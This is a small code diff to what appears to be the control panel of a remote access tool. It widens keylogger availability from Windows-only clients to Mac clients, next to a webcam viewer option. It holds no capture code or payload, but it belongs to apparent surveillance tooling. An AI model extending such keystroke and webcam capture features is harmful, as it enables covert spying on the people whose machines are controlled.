@@ -276,10 +276,11 @@ function applyMenuSupportRules(clientId) {
   setAvailability(webcamBtn, isOnline && isWindows, isOnline ? "Webcam viewer is only supported on Windows clients." : "Client is offline");
 
   const keyloggerBtn = menu.querySelector('[data-open="keylogger"]');
+  const keyloggerSupported = isWindows || platform === "mac";
   setAvailability(
     keyloggerBtn,
-    isOnline && isWindows,
-    isOnline ? "Keylogger capture is only fully supported on Windows clients." : "Client is offline",
+    isOnline && keyloggerSupported,
+    isOnline ? "Keylogger is not supported on this platform." : "Client is offline",
   );
 
   const winreBtn = menu.querySelector('[data-open="winre"]');
